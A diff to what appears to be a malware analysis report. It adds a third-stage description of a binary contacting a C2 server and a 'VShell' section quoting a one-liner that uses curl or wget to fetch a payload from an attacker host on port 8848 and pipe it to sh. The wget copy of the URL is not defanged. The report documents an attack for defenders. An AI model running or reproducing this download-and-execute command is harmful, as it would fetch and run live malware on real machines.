@@ -566,3 +566,18 @@ exit /b 0
 
 We can see this second stage will enumerate the operating systems architecture and write the corresponding binary to the file path C:\Users\Public\07f79946tcp.exe.
 ``` 
+
+### Stage 3
+
+`07f79946tcp.exe`, the third stage, reaches out to the C2 server, `microsoft-symantec[.]art:8848`, for additional payloads or stages to establish persistent Command and Control. We were unable to retrieve these or reverse engineer the protocol. 
+
+
+## VShell - Windows one-liner
+
+### Stage 1 
+
+```
+(curl -fsSL -m180 hxxp://microsoft-symantec[.]art:8848/slt||wget -T180 -q http://microsoft-symantec.art:8848/slt)|sh
+```
+
+* We can see this uses `curl` or `wget` to downloaded the payload `hxxp://microsoft-symantec[.]art:8848/slt` and execute it with `sh`.
